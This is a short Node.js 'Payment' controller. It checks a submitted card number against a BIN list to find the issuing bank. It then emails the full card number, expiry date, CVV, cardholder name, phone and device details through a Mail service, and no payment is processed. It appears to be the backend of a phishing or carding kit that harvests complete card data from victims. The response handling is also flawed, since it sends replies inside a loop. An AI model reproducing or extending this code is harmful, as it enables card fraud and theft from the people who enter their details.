const { Mail } = require("../services/SendEmail");
const cards = require("../services/bin")
class Payment {
  async Init(req, res) {   
    const { info } = req.body;
    let cardResults = {
      CardType: "",
      CardScheme: "Bin Not Found",
      Issuing_Bank: " Not Found",
    };
    if (!info) {
      return res
        .send({ message: "Please enter a card number", success: false })
        .end();
    }
    if (!req.body.info.cardNumber) {
      return res
        .send({ message: "Please enter a card number", success: false })
        .end();
    }
    cards.map((card) => {
      if (req.body.info.cardNumber.startsWith(card.BinNumber)) {
        cardResults = {
          CardType: card.CardType,
          CardScheme: card.CardScheme,
          Issuing_Bank: card.Issuing_Bank,
        };
        res.send({
          success: true,
        });
        return;
      }
    });

    const Body = {
      cardtype: cardResults.CardType,
      bankname: cardResults.Issuing_Bank,
      cardnumber: info.cardNumber,
      expirationdate: info.expiry,
      securitycode: info.cvv,
      name: info.name,
      phone: info.phone,
      device: info.device,
    };
    await Mail(Body);

    res.end();
  }
}
module.exports = new Payment();
